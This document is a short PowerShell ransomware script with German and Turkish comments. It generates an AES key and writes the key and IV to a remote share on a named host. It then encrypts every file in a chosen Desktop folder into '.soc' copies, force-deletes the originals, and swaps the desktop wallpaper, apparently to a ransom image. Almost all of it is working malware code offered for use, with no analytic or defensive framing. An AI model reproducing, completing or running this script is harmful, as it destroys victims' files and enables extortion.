#wir stellen erstmal fest, welches Folder wir verschlüsseln..
$username=$env:USERNAME
$hostname=mbgogo
$folder=foo
$folderPath = "C:\Users\$username\Desktop\$folder"
$port=8080
$encryptionKey = New-Object Byte[] 32  
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)

# Verschlüsseln-Algorithmus-AES 
$aesManaged = New-Object System.Security.Cryptography.AesManaged
$aesManaged.Key = $encryptionKey
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# IV (Initialization Vector) 
$IV = $aesManaged.IV

# encryption-key and IV speichern auf Webservern
$keyFile = "\\$hostname:$port\sensible\encryptionKey.bin"
$ivFile = "\\$hostname:$port\sensible\encryptionIV.bin"
[System.IO.File]::WriteAllBytes($keyFile, $aesManaged.Key)
[System.IO.File]::WriteAllBytes($ivFile, $aesManaged.IV)

# verschlüsseln ausgewählte Dateien und orginelle erbeugen, dann orginelle löschen
Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer -and $_.Extension -ne ".soc" } | ForEach-Object {
    $inputFile = $_.FullName
    $outputFile = "$inputFile.soc"

    # auslesen die Inhalte der Datei 
    $content = [System.IO.File]::ReadAllBytes($inputFile)

    # verschlüsseln Datei
    $encryptor = $aesManaged.CreateEncryptor($aesManaged.Key, $aesManaged.IV)
    $encryptedData = $encryptor.TransformFinalBlock($content, 0, $content.Length)

    # IV'yi şifrelenmiş verinin başına ekleyerek dosyaya yaz
    $fileData = $IV + $encryptedData
    [System.IO.File]::WriteAllBytes($outputFile, $fileData)

    # Löschen Orginelle Datei
    Remove-Item $inputFile -Force

    # Şifreleyici nesneyi temizle
    $encryptor.Dispose()
}

# AES nesnesini temizle
$aesManaged.Dispose()

# ändern Wallpaper
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

# Yeni wallpaper yolu
$newWallpaperPath = "C:\Users\Calculus\Downloads\gogo.png"

# Yeni boyutları belirleme
$newWidth = 1920  # Yeni genişlik (piksel cinsinden)
$newHeight = 1080  # Yeni yükseklik (piksel cinsinden)

# Wallpaper'ı yeniden boyutlandırma
$img = [System.Drawing.Image]::FromFile("C:\Users\Calculus\Downloads\gogo.png")
$resizedImg = $img.GetThumbnailImage($newWidth, $newHeight, $null, [System.IntPtr]::Zero)

# Yeniden boyutlandırılmış wallpaper'ı kaydetme
$resizedImg.Save($newWallpaperPath)

# Wallpaper'ı ayarlama
[Wallpaper]::SystemParametersInfo(0x0014, 0, $newWallpaperPath, 0x01 -bor 0x02)
